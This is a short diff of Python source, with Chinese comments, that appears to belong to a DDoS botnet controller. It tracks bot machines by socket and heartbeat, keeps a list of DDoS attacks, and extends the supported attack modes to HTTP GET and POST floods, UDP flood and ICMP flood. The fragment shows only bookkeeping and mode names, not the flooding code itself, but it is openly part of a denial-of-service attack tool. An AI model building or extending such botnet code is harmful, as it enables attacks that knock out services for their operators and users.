@@ -9,7 +9,7 @@ buffsize = 512 #数据包大小
 datasock_list = {}  # 机器字典  {No:socket}
 last_Heartbeat = {}  # 记录机器的上次心跳时间
 ddos_attack_list = [] # 记录ddos的攻击列表
-mode_list = ['httpGETflood', 'httpPOSTflood', 'udpflood']
+mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # 攻击方法
 # 带颜色打印
 def print_error(str : str):
     print('\033[0;31m' + '[-] ' + str + '\033[0m')
